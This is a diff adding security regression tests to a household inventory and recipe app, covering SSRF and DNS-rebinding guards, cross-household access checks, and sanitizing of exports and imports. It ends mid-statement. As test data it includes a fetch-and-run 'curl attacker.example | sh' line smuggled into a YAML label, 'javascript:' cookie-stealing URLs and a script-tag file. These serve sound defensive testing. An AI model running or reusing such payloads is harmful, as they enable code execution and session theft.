@@ -676,19 +676,28 @@ describe("recipe link import", () => {
   });
 
   it("refuses a redirect to a private address", async () => {
-    const originalFetch = globalThis.fetch;
+    const { setOutboundResolverForTests } = await import("../lib/outbound.js");
     const previous = process.env.SV_OUTBOUND_ALLOW_PRIVATE;
     process.env.SV_OUTBOUND_ALLOW_PRIVATE = "false";
     let calls = 0;
-    globalThis.fetch = (async () => {
+    const site = http.createServer((_req, res) => {
       calls += 1;
-      return new Response(null, { status: 302, headers: { location: "http://127.0.0.1:9/secret" } });
-    }) as typeof fetch;
+      res.writeHead(302, { location: "http://internal.example:9/secret" });
+      res.end();
+    });
+    await new Promise<void>((resolve) => site.listen(0, "127.0.0.1", resolve));
+    const port = (site.address() as import("node:net").AddressInfo).port;
+    // recipe.example stands in for a public site; internal.example for the LAN.
+    setOutboundResolverForTests(
+      async (host) => [{ address: host === "internal.example" ? "10.0.0.5" : "127.0.0.1", family: 4 }],
+      (address) => address.startsWith("10."),
+    );
     try {
-      await assert.rejects(importRecipeFromUrl("http://93.184.216.34/recipe"), /private or local network/i);
+      await assert.rejects(importRecipeFromUrl(`http://recipe.example:${port}/recipe`), /private or local network/i);
       assert.equal(calls, 1, "the private hop must be rejected before it is fetched");
     } finally {
-      globalThis.fetch = originalFetch;
+      setOutboundResolverForTests();
+      await new Promise((resolve) => site.close(resolve));
       if (previous === undefined) delete process.env.SV_OUTBOUND_ALLOW_PRIVATE;
       else process.env.SV_OUTBOUND_ALLOW_PRIVATE = previous;
     }
@@ -2024,6 +2033,34 @@ describe("inventory and stock", () => {
     assert.equal(res.data.barcodes.length, 1);
     assert.equal(res.data.priceStats.latest, 1.2);
     itemId = res.data.id;
+  });
+
+  it("rejects foreign and self references in household taxonomies", async () => {
+    const foreign = await request("/api/houses", { method: "POST", body: { name: "Foreign taxonomy" } });
+    const foreignId = foreign.data.id;
+    for (const type of ["locations", "categories"]) {
+      const foreignRows = await request(`/api/houses/${foreignId}/${type}`);
+      const localRows = await request(`/api/houses/${houseId}/${type}`);
+      const foreignIdValue = foreignRows.data[0].id;
+      const localId = localRows.data[0].id;
+      assert.equal((await request(`/api/houses/${houseId}/${type}`, { method: "POST", body: { name: "Invalid", parentId: foreignIdValue } })).status, 400);
+      for (const parentId of [foreignIdValue, localId]) {
+        assert.equal((await request(`/api/houses/${houseId}/${type}/${localId}`, { method: "PATCH", body: { parentId } })).status, 400);
+      }
+      // A -> B -> C is fine; then making A a child of C would close a loop.
+      const a = await request(`/api/houses/${houseId}/${type}`, { method: "POST", body: { name: `Loop A ${type}` } });
+      const b = await request(`/api/houses/${houseId}/${type}`, { method: "POST", body: { name: `Loop B ${type}`, parentId: a.data.id } });
+      const c = await request(`/api/houses/${houseId}/${type}`, { method: "POST", body: { name: `Loop C ${type}`, parentId: b.data.id } });
+      assert.ok(c.status < 300, JSON.stringify(c.data));
+      assert.equal((await request(`/api/houses/${houseId}/${type}/${a.data.id}`, { method: "PATCH", body: { parentId: c.data.id } })).status, 400);
+      assert.equal((await request(`/api/houses/${houseId}/${type}/${c.data.id}`, { method: "PATCH", body: { parentId: a.data.id } })).status, 200);
+    }
+    const foreignCategories = await request(`/api/houses/${foreignId}/categories`);
+    const categoryId = foreignCategories.data[0].id;
+    assert.equal((await request(`/api/houses/${houseId}/attributes`, { method: "POST", body: { key: "cross_house", label: "Cross house", type: "text", categoryId } })).status, 400);
+    const created = await request(`/api/houses/${houseId}/attributes`, { method: "POST", body: { key: "local_test", label: "Local test", type: "text" } });
+    assert.equal(created.status, 201);
+    assert.equal((await request(`/api/houses/${houseId}/attributes/${created.data.id}`, { method: "PATCH", body: { categoryId } })).status, 400);
   });
 
   it("rejects category and stock locations outside the household", async () => {
@@ -4041,6 +4078,20 @@ describe("OpenFoodFacts links and shared catalogue", () => {
       assert.ok(price);
       assert.equal(price.ready, true);
 
+      // An item from another household must not ride along on a price contribution.
+      const otherHouse = (await request("/api/auth/me", { auth: secondUserCookie })).data.houses.find((house: any) => house.role === "owner").id;
+      const foreignItem = await request(`/api/houses/${otherHouse}/items`, {
+        method: "POST",
+        auth: secondUserCookie,
+        body: { name: "Other household secret" },
+      });
+      assert.equal(foreignItem.status, 201);
+      const smuggled = await request("/api/off/contributions", {
+        method: "POST",
+        body: { houseId, receiptLineId: lineId, itemId: foreignItem.data.id, kind: "price", fields: ["price"] },
+      });
+      assert.equal(smuggled.status, 404);
+
       const queued = await request("/api/off/contributions", {
         method: "POST",
         body: { houseId, receiptLineId: lineId, kind: "price", fields: ["price"] },
@@ -4066,6 +4117,125 @@ describe("OpenFoodFacts links and shared catalogue", () => {
       else process.env.SV_OFF_WRITE_ENABLED = savedWrites;
       if (savedDryRun === undefined) delete process.env.SV_OFF_DRY_RUN;
       else process.env.SV_OFF_DRY_RUN = savedDryRun;
+    }
+  });
+
+  it("refuses to retry or send a contribution after the contributor loses member access", async () => {
+    const strangerMe = await request("/api/auth/me", { auth: secondUserCookie });
+    const strangerId = strangerMe.data.user.id;
+    if (!strangerMe.data.houses.some((house: any) => house.id === houseId)) {
+      const invite = await request(`/api/houses/${houseId}/members`, {
+        method: "POST",
+        body: { email: "stranger@example.com", role: "member" },
+      });
+      assert.equal(invite.status, 201);
+      const accepted = await request(`/api/auth/invites/${invite.data.invite.code}/accept`, {
+        method: "POST",
+        auth: secondUserCookie,
+      });
+      assert.equal(accepted.status, 200);
+    } else {
+      const promoted = await request(`/api/houses/${houseId}/members/${strangerId}`, {
+        method: "PATCH",
+        body: { role: "member" },
+      });
+      assert.equal(promoted.status, 200);
+    }
+    const contributionId = `offc_left_${randomUUID().slice(0, 8)}`;
+    const stamp = new Date().toISOString();
+    await run(
+      `INSERT INTO off_contributions
+         (id, idempotency_key, user_id, house_id, project, code, kind, payload, field_keys, status, attempts, created_at, updated_at)
+       VALUES (?, ?, ?, ?, 'off', '0000000000017', 'missing_fields', '{}', '["brand"]', 'failed', 3, ?, ?)`,
+      [contributionId, `left-${contributionId}`, strangerId, houseId, stamp, stamp],
+    );
+    const savedWrites = process.env.SV_OFF_WRITE_ENABLED;
+    const savedDryRun = process.env.SV_OFF_DRY_RUN;
+    process.env.SV_OFF_WRITE_ENABLED = "true";
+    process.env.SV_OFF_DRY_RUN = "true";
+    try {
+      const demoted = await request(`/api/houses/${houseId}/members/${strangerId}`, {
+        method: "PATCH",
+        body: { role: "viewer" },
+      });
+      assert.equal(demoted.status, 200);
+      const viewerRetry = await request(`/api/off/contributions/${contributionId}/retry`, {
+        method: "POST",
+        auth: secondUserCookie,
+      });
+      assert.equal(viewerRetry.status, 403);
+
+      const removed = await request(`/api/houses/${houseId}/members/${strangerId}`, { method: "DELETE" });
+      assert.equal(removed.status, 200);
+      const formerRetry = await request(`/api/off/contributions/${contributionId}/retry`, {
+        method: "POST",
+        auth: secondUserCookie,
+      });
+      assert.equal(formerRetry.status, 403);
+      const row = await get<any>("SELECT status FROM off_contributions WHERE id = ?", [contributionId]);
+      assert.equal(row.status, "failed");
+
+      // A row already queued (e.g. by the worker's retry schedule) is not sent either.
+      await run("UPDATE off_contributions SET status = 'queued' WHERE id = ?", [contributionId]);
+      const { processContribution, CONTRIBUTOR_LEFT_HOUSE } = await import("../services/off/contributions.js");
+      await processContribution(contributionId);
+      const after = await get<any>("SELECT status, remote_message FROM off_contributions WHERE id = ?", [contributionId]);
+      assert.equal(after.status, "failed");
+      assert.equal(after.remote_message, CONTRIBUTOR_LEFT_HOUSE);
+    } finally {
+      await run("DELETE FROM off_contribution_events WHERE contribution_id = ?", [contributionId]);
+      await run("DELETE FROM off_contributions WHERE id = ?", [contributionId]);
+      if (savedWrites === undefined) delete process.env.SV_OFF_WRITE_ENABLED;
+      else process.env.SV_OFF_WRITE_ENABLED = savedWrites;
+      if (savedDryRun === undefined) delete process.env.SV_OFF_DRY_RUN;
+      else process.env.SV_OFF_DRY_RUN = savedDryRun;
+    }
+  });
+
+  it("hides a contribution's item name after the contributor leaves the house", async () => {
+    const strangerMe = await request("/api/auth/me", { auth: secondUserCookie });
+    const strangerId = strangerMe.data.user.id;
+    const stamp = new Date().toISOString();
+    await run(
+      "INSERT INTO house_members (house_id, user_id, role, created_at) VALUES (?, ?, 'member', ?) ON CONFLICT DO NOTHING",
+      [houseId, strangerId, stamp],
+    );
+    const item = await request(`/api/houses/${houseId}/items`, {
+      method: "POST",
+      body: { name: "Name leak feta", unit: "pcs" },
+    });
+    assert.equal(item.status, 201);
+    const contributionId = `offc_name_${randomUUID().slice(0, 8)}`;
+    await run(
+      `INSERT INTO off_contributions
+         (id, idempotency_key, user_id, house_id, item_id, project, code, kind, payload, field_keys, status, attempts, created_at, updated_at)
+       VALUES (?, ?, ?, ?, ?, 'off', ?, 'missing_fields', '{}', '["brand"]', 'sent', 1, ?, ?)`,
+      [contributionId, `name-${contributionId}`, strangerId, houseId, item.data.id, fetaCode, stamp, stamp],
+    );
+    try {
+      const list = await request("/api/off/contributions", { auth: secondUserCookie });
+      const listed = list.data.contributions.find((row: any) => row.id === contributionId);
+      assert.equal(listed.itemName, "Name leak feta");
+      const one = await request(`/api/off/contributions/${contributionId}`, { auth: secondUserCookie });
+      assert.equal(one.data.contribution.itemName, "Name leak feta");
+
+      await run("DELETE FROM house_members WHERE house_id = ? AND user_id = ?", [houseId, strangerId]);
+
+      const afterList = await request("/api/off/contributions", { auth: secondUserCookie });
+      const hidden = afterList.data.contributions.find((row: any) => row.id === contributionId);
+      assert.ok(hidden);
+      assert.equal(hidden.itemName, null);
+      // The rest of the row is unchanged, only the live item name is withheld.
+      assert.equal(hidden.code, fetaCode);
+      assert.equal(hidden.itemId, item.data.id);
+      const afterOne = await request(`/api/off/contributions/${contributionId}`, { auth: secondUserCookie });
+      assert.equal(afterOne.status, 200);
+      assert.equal(afterOne.data.contribution.itemName, null);
+      assert.equal(afterOne.data.contribution.itemId, item.data.id);
+    } finally {
+      await run("DELETE FROM house_members WHERE house_id = ? AND user_id = ?", [houseId, strangerId]);
+      await run("DELETE FROM off_contribution_events WHERE contribution_id = ?", [contributionId]);
+      await run("DELETE FROM off_contributions WHERE id = ?", [contributionId]);
     }
   });
 
@@ -4207,6 +4377,146 @@ describe("OpenFoodFacts links and shared catalogue", () => {
       assert.ok(answerBody.includes("annotation=-1"));
     } finally {
       globalThis.fetch = originalFetch;
+      if (savedWrites === undefined) delete process.env.SV_OFF_WRITE_ENABLED;
+      else process.env.SV_OFF_WRITE_ENABLED = savedWrites;
+      if (savedDryRun === undefined) delete process.env.SV_OFF_DRY_RUN;
+      else process.env.SV_OFF_DRY_RUN = savedDryRun;
+    }
+  });
+
+  it("requires consent and a household membership to answer Robotoff questions", async () => {
+    const savedWrites = process.env.SV_OFF_WRITE_ENABLED;
+    const savedDryRun = process.env.SV_OFF_DRY_RUN;
+    process.env.SV_OFF_WRITE_ENABLED = "true";
+    process.env.SV_OFF_DRY_RUN = "true";
+    const registered = await request("/api/auth/register", {
+      method: "POST",
+      auth: "",
+      body: { name: "Robotoff Outsider", email: "robotoff-outsider@example.com", password: "test password" },
+    });
+    assert.equal(registered.status, 201);
+    const outsiderCookie = registered.cookie!;
+    const me = await request("/api/auth/me", { auth: outsiderCookie });
+    const userId = me.data.user.id;
+    const ownHouse = me.data.houses[0].id;
+    const answer = () =>
+      request("/api/off/robotoff/answers", {
+        method: "POST",
+        auth: outsiderCookie,
+        body: { insightId: "insight-outsider", annotation: 1 },
+      });
+    try {
+      const noConsent = await answer();
+      assert.equal(noConsent.status, 403);
+      assert.match(String(noConsent.data.error), /license/i);
+
+      const accepted = await request("/api/off/consent", {
+        method: "POST",
+        auth: outsiderCookie,
+        body: { accept: true },
+      });
+      assert.equal(accepted.status, 200);
+
+      await run("DELETE FROM house_members WHERE user_id = ?", [userId]);
+      const noHouse = await answer();
+      assert.equal(noHouse.status, 403);
+      assert.match(String(noHouse.data.error), /member access/i);
+
+      await run(
+        "INSERT INTO house_members (house_id, user_id, role, created_at) VALUES (?, ?, 'owner', ?) ON CONFLICT DO NOTHING",
+        [ownHouse, userId, new Date().toISOString()],
+      );
+      const allowed = await answer();
+      assert.equal(allowed.status, 200);
+      assert.equal(allowed.data.dryRun, true);
+    } finally {
+      await run("DELETE FROM off_consents WHERE user_id = ?", [userId]);
+      await run(
+        "INSERT INTO house_members (house_id, user_id, role, created_at) VALUES (?, ?, 'owner', ?) ON CONFLICT DO NOTHING",
+        [ownHouse, userId, new Date().toISOString()],
+      );
+      if (savedWrites === undefined) delete process.env.SV_OFF_WRITE_ENABLED;
+      else process.env.SV_OFF_WRITE_ENABLED = savedWrites;
+      if (savedDryRun === undefined) delete process.env.SV_OFF_DRY_RUN;
+      else process.env.SV_OFF_DRY_RUN = savedDryRun;
+    }
+  });
+
+  it("requires consent and a household membership to write folksonomy properties", async () => {
+    const savedWrites = process.env.SV_OFF_WRITE_ENABLED;
+    const savedDryRun = process.env.SV_OFF_DRY_RUN;
+    process.env.SV_OFF_WRITE_ENABLED = "true";
+    process.env.SV_OFF_DRY_RUN = "true";
+    const registered = await request("/api/auth/register", {
+      method: "POST",
+      auth: "",
+      body: { name: "Folksonomy Outsider", email: "folksonomy-outsider@example.com", password: "test password" },
+    });
+    assert.equal(registered.status, 201);
+    const outsiderCookie = registered.cookie!;
+    const me = await request("/api/auth/me", { auth: outsiderCookie });
+    const userId = me.data.user.id;
+    const ownHouse = me.data.houses[0].id;
+    const property = (extra: Record<string, unknown> = {}) =>
+      request("/api/off/folksonomy", {
+        method: "POST",
+        auth: outsiderCookie,
+        body: { project: "off", code: fetaCode, key: "svault-test", value: "yes", ...extra },
+      });
+    try {
+      const noConsent = await property();
+      assert.equal(noConsent.status, 403);
+      assert.match(String(noConsent.data.error), /license/i);
+
+      const accepted = await request("/api/off/consent", {
+        method: "POST",
+        auth: outsiderCookie,
+        body: { accept: true },
+      });
+      assert.equal(accepted.status, 200);
+
+      await run("DELETE FROM house_members WHERE user_id = ?", [userId]);
+      const noHouse = await property();
+      assert.equal(noHouse.status, 403);
+      assert.match(String(noHouse.data.error), /member access/i);
+
+      await run(
+        "INSERT INTO house_members (house_id, user_id, role, created_at) VALUES (?, ?, 'owner', ?) ON CONFLICT DO NOTHING",
+        [ownHouse, userId, new Date().toISOString()],
+      );
+      const ownItem = await request(`/api/houses/${ownHouse}/items`, {
+        method: "POST",
+        auth: outsiderCookie,
+        body: { name: "Folksonomy item", unit: "pcs" },
+      });
+      assert.equal(ownItem.status, 201);
+
+      // A named house needs member+ access, and its item must live there.
+      const foreignHouse = await property({ houseId });
+      assert.equal(foreignHouse.status, 404);
+      await run(
+        "INSERT INTO house_members (house_id, user_id, role, created_at) VALUES (?, ?, 'viewer', ?) ON CONFLICT DO NOTHING",
+        [houseId, userId, new Date().toISOString()],
+      );
+      const viewerHouse = await property({ houseId });
+      assert.equal(viewerHouse.status, 403);
+      assert.match(String(viewerHouse.data.error), /member access/i);
+      await run("DELETE FROM house_members WHERE house_id = ? AND user_id = ?", [houseId, userId]);
+      const foreignItem = await property({ houseId: ownHouse, itemId });
+      assert.equal(foreignItem.status, 404);
+
+      const withItem = await property({ itemId: ownItem.data.id });
+      assert.equal(withItem.status, 200);
+      assert.equal(withItem.data.dryRun, true);
+      const withHouse = await property({ houseId: ownHouse, itemId: ownItem.data.id });
+      assert.equal(withHouse.status, 200);
+      assert.equal(withHouse.data.dryRun, true);
+    } finally {
+      await run("DELETE FROM off_consents WHERE user_id = ?", [userId]);
+      await run(
+        "INSERT INTO house_members (house_id, user_id, role, created_at) VALUES (?, ?, 'owner', ?) ON CONFLICT DO NOTHING",
+        [ownHouse, userId, new Date().toISOString()],
+      );
       if (savedWrites === undefined) delete process.env.SV_OFF_WRITE_ENABLED;
       else process.env.SV_OFF_WRITE_ENABLED = savedWrites;
       if (savedDryRun === undefined) delete process.env.SV_OFF_DRY_RUN;
@@ -5304,6 +5614,46 @@ describe("recipes", () => {
     }
   });
 
+  it("drops a non-http cover image advertised by an imported page", async () => {
+    const html = `<!doctype html><html><head><title>Scheme soup</title>
+      <meta property="og:image" content="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">
+      <script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "Recipe",
+        "name": "Scheme soup",
+        "recipeIngredient": ["1 l water", "1 onion"],
+        "recipeInstructions": ["Boil the water."],
+        "image": "javascript:alert(document.cookie)"
+      }
+      </script></head><body></body></html>`;
+    const pageServer = http.createServer((_req, res) => {
+      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
+      res.end(html);
+    });
+    await new Promise<void>((resolve) => pageServer.listen(0, "127.0.0.1", () => resolve()));
+    const pageAddress = pageServer.address();
+    if (!pageAddress || typeof pageAddress === "string") throw new Error("no import page address");
+    const link = `http://127.0.0.1:${pageAddress.port}/scheme-soup`;
+    try {
+      const preview = await request(`/api/houses/${houseId}/recipes/import`, { method: "POST", body: { url: link } });
+      assert.equal(preview.status, 200);
+      assert.equal(preview.data.image, null);
+      const saved = await request(`/api/houses/${houseId}/recipes/import`, { method: "POST", body: { url: link, save: true } });
+      assert.equal(saved.status, 201);
+      assert.equal(saved.data.recipe.image, null);
+      const stored = await get<any>("SELECT image FROM recipes WHERE id = ?", [saved.data.recipe.id]);
+      assert.equal(stored.image, null);
+      await request(`/api/recipes/${saved.data.recipe.id}`, { method: "DELETE" });
+      assert.equal(
+        parseRecipePage(html.replace("javascript:alert(document.cookie)", "/covers/soup.jpg"), link).image,
+        `http://127.0.0.1:${pageAddress.port}/covers/soup.jpg`,
+      );
+    } finally {
+      await new Promise<void>((resolve, reject) => pageServer.close((error) => (error ? reject(error) : resolve())));
+    }
+  });
+
   it("rejects an unreachable import link", async () => {
     const res = await request(`/api/houses/${houseId}/recipes/import`, {
       method: "POST",
@@ -5321,6 +5671,16 @@ describe("ideas", () => {
     assert.equal(res.data.provider, "local");
     assert.ok(Array.isArray(res.data.ideas));
     assert.ok(res.data.ideas.length > 0);
+  });
+
+  it("answers a non-member saving another household's idea as not found", async () => {
+    const idea = await request(`/api/houses/${houseId}/ideas`, { method: "POST", body: { prompt: "quick" } });
+    assert.equal(idea.status, 200);
+    const foreign = await request(`/api/ideas/${idea.data.id}/save`, { method: "POST", auth: secondUserCookie, body: { index: 0 } });
+    const missing = await request(`/api/ideas/ida_does_not_exist/save`, { method: "POST", auth: secondUserCookie, body: { index: 0 } });
+    assert.equal(missing.status, 404);
+    assert.equal(foreign.status, 404);
+    assert.equal(foreign.data.error, "Idea not found");
   });
 });
 
@@ -5675,6 +6035,48 @@ describe("photos and datasets", () => {
     assert.equal(res.headers.get("content-type"), "application/zip");
   });
 
+  it("neutralizes spreadsheet formulas in dataset manifest cells", async () => {
+    const png = encodePng(8, 8, Buffer.alloc(8 * 8 * 4, 220));
+    const form = new FormData();
+    form.append("photos", new Blob([new Uint8Array(png)], { type: "image/png" }), "test.png");
+    form.append("meta", JSON.stringify([{ originalName: '=1+1,"quoted"' }]));
+    const upload = await request(`/api/houses/${houseId}/photos`, { method: "POST", body: form });
+    assert.equal(upload.status, 201);
+    const id = upload.data.photos[0].id;
+    try {
+      assert.equal((await request(`/api/photos/${id}/labels`, { method: "POST", body: { label: "+1+1" } })).status, 201);
+      const response = await fetch(`${base}/api/houses/${houseId}/photos/export?format=yolo`, { headers: { cookie } });
+      const zip = await JSZip.loadAsync(Buffer.from(await response.arrayBuffer()));
+      const manifest = await zip.file("svault-dataset/manifest.csv")!.async("string");
+      assert.ok(manifest.includes(`"'=1+1,""quoted"""`));
+      assert.ok(manifest.includes(`"'+1+1"`));
+    } finally {
+      await request(`/api/photos/${id}`, { method: "DELETE" });
+    }
+  });
+
+  it("keeps label text from adding keys to the exported data.yaml", async () => {
+    const png = encodePng(8, 8, Buffer.alloc(8 * 8 * 4, 200));
+    const form = new FormData();
+    form.append("photos", new Blob([new Uint8Array(png)], { type: "image/png" }), "yaml.png");
+    const upload = await request(`/api/houses/${houseId}/photos`, { method: "POST", body: form });
+    assert.equal(upload.status, 201);
+    const id = upload.data.photos[0].id;
+    try {
+      const label = "tomato\ndownload: bash curl attacker.example | sh";
+      assert.equal((await request(`/api/photos/${id}/labels`, { method: "POST", body: { label } })).status, 201);
+      const response = await fetch(`${base}/api/houses/${houseId}/photos/export?format=yolo`, { headers: { cookie } });
+      const zip = await JSZip.loadAsync(Buffer.from(await response.arrayBuffer()));
+      const yaml = await zip.file("svault-dataset/data.yaml")!.async("string");
+      assert.ok(!yaml.split("\n").some((line) => line.startsWith("download:")), yaml);
+      assert.ok(yaml.includes('"tomato download: bash curl attacker.example | sh"'));
+      const classes = await zip.file("svault-dataset/classes.txt")!.async("string");
+      assert.ok(!classes.split("\n").includes("download: bash curl attacker.example | sh"));
+    } finally {
+      await request(`/api/photos/${id}`, { method: "DELETE" });
+    }
+  });
+
   it("exports images, labels and classes as a YOLO zip", async () => {
     const res = await fetch(`${base}/api/houses/${houseId}/photos/export?format=yolo`, { headers: { cookie } });
     const zip = await JSZip.loadAsync(Buffer.from(await res.arrayBuffer()));
@@ -5830,18 +6232,76 @@ describe("security hardening", () => {
     const ok = await uploadImage(`/api/houses/${houseId}/recipes/upload`, new Uint8Array(png), "image/png", "photo.html");
     assert.equal(ok.status, 201);
     assert.match(ok.data.path, /^\/uploads\/recipes\/[\w-]+\.png$/);
-    const served = await fetch(`${base}${ok.data.path}`);
+    const served = await fetch(`${base}${ok.data.path}`, { headers: { cookie } });
     assert.equal(served.status, 200);
     assert.equal(served.headers.get("x-content-type-options"), "nosniff");
     assert.match(served.headers.get("content-security-policy") ?? "", /sandbox/);
     assert.equal(served.headers.get("content-disposition"), null);
   });
 
+  it("keeps uploads inside their household", async () => {
+    const png = new Uint8Array(encodePng(4, 4, Buffer.alloc(4 * 4 * 4, 120)));
+    const recipeUpload = await uploadImage(`/api/houses/${houseId}/recipes/upload`, png, "image/png", "card.png");
+    const receiptUpload = await uploadImage(`/api/houses/${houseId}/receipts/upload`, png, "image/png", "receipt.png");
+    assert.equal(recipeUpload.status, 201);
+    assert.equal(receiptUpload.status, 201);
+    const recipePath: string = recipeUpload.data.path;
+    const receiptPath: string = receiptUpload.data.path;
+
+    // Files need a signed-in session, and are cached privately.
+    assert.equal((await fetch(`${base}${receiptPath}`)).status, 404);
+    const own = await fetch(`${base}${receiptPath}`, { headers: { cookie } });
+    assert.equal(own.status, 200);
+    assert.equal(own.headers.get("cache-control"), "private, no-cache");
+
+    // Another household cannot read, attach or delete them by naming the path.
+    const as = (pathname: string, method: string, body: unknown) =>
+      request(`/api/houses/${strangerHouseId}${pathname}`, { method, auth: secondUserCookie, body });
+    assert.equal((await as("/recipes/scan", "POST", { text: "Soup", images: [recipePath] })).status, 400);
+    assert.equal((await as("/receipts/scan", "POST", { images: [receiptPath] })).status, 400);
+    assert.equal((await as("/intake/parse", "POST", { image: receiptPath })).status, 400);
+    assert.equal((await as("/recipes", "POST", { title: "Borrowed", sourceImage: recipePath })).status, 400);
+    assert.equal((await as("/recipes", "POST", { title: "Borrowed", image: recipePath })).status, 400);
+    assert.equal((await as("/items", "POST", { name: "Borrowed", image: recipePath })).status, 400);
+    assert.equal((await as("/receipts/upload", "DELETE", { path: receiptPath })).status, 404);
+    assert.equal(existsSync(path.join(dataDir, "uploads", "receipts", receiptPath.split("/").pop()!)), true);
+
+    // Only uploads and http(s) links are accepted where the client renders them.
+    assert.equal((await as("/recipes", "POST", { title: "Script", image: "javascript:alert(1)" })).status, 400);
+    assert.equal((await as("/recipes", "POST", { title: "Script", sourceImage: "https://example.com/a.png" })).status, 400);
+    const remote = await as("/items", "POST", { name: "Remote picture", image: "https://images.openfoodfacts.org/x.jpg" });
+    assert.ok(remote.status < 300, JSON.stringify(remote.data));
+
+    // The owning house can still use its own upload.
+    const saved = await request(`/api/houses/${houseId}/recipes`, {
+      method: "POST",
+      body: { title: "Own card", sourceImage: recipePath, image: recipePath },
+    });
+    assert.ok(saved.status < 300, JSON.stringify(saved.data));
+    assert.equal(saved.data.sourceImage, recipePath);
+  });
+
+  it("refuses recipe ingredients linked to another household's item", async () => {
+    const borrowed = await request(`/api/houses/${strangerHouseId}/recipes`, {
+      method: "POST",
+      auth: secondUserCookie,
+      body: { title: "Borrowed stock", ingredients: [{ name: "Their item", quantity: 1, unit: "pcs", itemId }] },
+    });
+    assert.equal(borrowed.status, 400);
+    assert.match(borrowed.data.error, /not in this house/);
+
+    const own = await request(`/api/houses/${houseId}/recipes`, {
+      method: "POST",
+      body: { title: "Own stock", ingredients: [{ name: "Our item", quantity: 1, unit: "pcs", itemId }] },
+    });
+    assert.ok(own.status < 300, JSON.stringify(own.data));
+  });
+
   it("serves non-image files under /uploads as sandboxed downloads", async () => {
     const { writeFileSync, mkdirSync } = await import("node:fs");
     mkdirSync(path.join(dataDir, "uploads", "recipes"), { recursive: true });
     writeFileSync(path.join(dataDir, "uploads", "recipes", "legacy.html"), "<script>alert(1)</script>");
-    const res = await fetch(`${base}/uploads/recipes/legacy.html`);
+    const res = await fetch(`${base}/uploads/recipes/legacy.html`, { headers: { cookie } });
     assert.equal(res.status, 200);
     assert.equal(res.headers.get("content-disposition"), "attachment");
     assert.equal(res.headers.get("content-type"), "application/octet-stream");
@@ -5936,6 +6396,91 @@ describe("security hardening", () => {
       assert.match(channel.data.error, /private or local network/);
     } finally {
       delete process.env.SV_OUTBOUND_ALLOW_PRIVATE;
+    }
+  });
+
+  it("checks the address it connects to, not only the address it validated", async () => {
+    const { fetchOutbound, outboundFetch, setOutboundResolverForTests } = await import("../lib/outbound.js");
+    let hits = 0;
+    const target = http.createServer((_req, res) => {
+      hits += 1;
+      res.end("internal");
+    });
+    await new Promise<void>((resolve) => target.listen(0, "127.0.0.1", resolve));
+    const port = (target.address() as import("node:net").AddressInfo).port;
+    let lookups = 0;
+    // A rebinding name answers public for the guard, then loopback for the socket.
+    setOutboundResolverForTests(async () => {
+      lookups += 1;
+      return [{ address: lookups === 1 ? "93.184.216.34" : "127.0.0.1", family: 4 }];
+    });
+    process.env.SV_OUTBOUND_ALLOW_PRIVATE = "false";
+    try {
+      await assert.rejects(() => fetchOutbound(`http://rebind.example:${port}/`, { label: "The link" }), /private or local network/);
+      assert.ok(lookups >= 2);
+      await assert.rejects(() => outboundFetch(`http://rebind.example:${port}/`, { method: "POST", body: "{}" }), /private or local network/);
+      assert.equal(hits, 0);
+
+      // Private targets stay reachable when the instance allows them.
+      process.env.SV_OUTBOUND_ALLOW_PRIVATE = "true";
+      const allowed = await outboundFetch(`http://127.0.0.1:${port}/`);
+      assert.equal(await allowed.text(), "internal");
+      assert.equal(hits, 1);
+    } finally {
+      delete process.env.SV_OUTBOUND_ALLOW_PRIVATE;
+      setOutboundResolverForTests();
+      await new Promise((resolve) => target.close(resolve));
+    }
+  });
+
+  it("returns status, headers and body over a pinned connection", async () => {
+    const { outboundFetch, setOutboundResolverForTests } = await import("../lib/outbound.js");
+    const target = http.createServer((req, res) => {
+      let body = "";
+      req.on("data", (chunk) => (body += chunk));
+      req.on("end", () => {
+        if (req.url === "/moved") {
+          res.writeHead(302, { location: "/" });
+          res.end();
+          return;
+        }
+        res.writeHead(201, {
+          "content-type": "application/json",
+          "x-echo": String(req.headers["x-test"] ?? ""),
+          "x-length": String(req.headers["content-length"] ?? ""),
+          "x-chunked": String(req.headers["transfer-encoding"] ?? ""),
+        });
+        res.end(JSON.stringify({ method: req.method, body }));
+      });
+    });
+    await new Promise<void>((resolve) => target.listen(0, "127.0.0.1", resolve));
+    const port = (target.address() as import("node:net").AddressInfo).port;
+    // Treat the local test server as public so the pinned request path runs end to end.
+    setOutboundResolverForTests(async () => [{ address: "127.0.0.1", family: 4 }], () => false);
+    process.env.SV_OUTBOUND_ALLOW_PRIVATE = "false";
+    try {
+      const response = await outboundFetch(`http://pinned.example:${port}/`, {
+        method: "POST",
+        headers: { "x-test": "yes", "content-type": "application/json" },
+        body: "{\"a\":1}",
+      });
+      assert.equal(response.status, 201);
+      assert.equal(response.headers.get("x-echo"), "yes");
+      assert.equal(response.headers.get("x-length"), "7", "string bodies go out with a fixed length");
+      assert.equal(response.headers.get("x-chunked"), "");
+      assert.deepEqual(await response.json(), { method: "POST", body: "{\"a\":1}" });
+
+      await assert.rejects(() => outboundFetch(`http://pinned.example:${port}/moved`, { redirect: "error" }), /redirect/);
+      const manual = await outboundFetch(`http://pinned.example:${port}/moved`, { redirect: "manual" });
+      assert.equal(manual.status, 302);
+      assert.equal(manual.headers.get("location"), "/");
+
+      setOutboundResolverForTests();
+      await assert.rejects(() => outboundFetch(`http://127.0.0.1:${port}/`), /private or local network/);
+    } finally {
+      delete process.env.SV_OUTBOUND_ALLOW_PRIVATE;
+      setOutboundResolverForTests();
+      await new Promise((resolve) => target.close(resolve));
     }
   });
 
@@ -6078,6 +6623,43 @@ describe("security hardening", () => {
     assert.ok(existsSync(fileOf(kept.data.image)));
   });
 
+  it("leaves another household's upload alone when an old recipe points at it", async () => {
+    const { existsSync } = await import("node:fs");
+    const fileOf = (url: string) => path.join(dataDir, url.replace(/^\//, ""));
+    const png = new Uint8Array(encodePng(4, 4, Buffer.alloc(4 * 4 * 4, 180)));
+    const foreign = await uploadImage(
+      `/api/houses/${strangerHouseId}/recipes/upload`,
+      png,
+      "image/png",
+      "foreign.png",
+      secondUserCookie,
+    );
+    assert.equal(foreign.status, 201);
+    assert.ok(existsSync(fileOf(foreign.data.path)));
+
+    // Recipe create refuses a foreign image, so plant the stale link directly.
+    const id = `rcp_stale_${randomUUID().slice(0, 8)}`;
+    const stamp = new Date().toISOString();
+    await run(
+      `INSERT INTO recipes (id, house_id, title, steps, tags, image, source, created_at, updated_at)
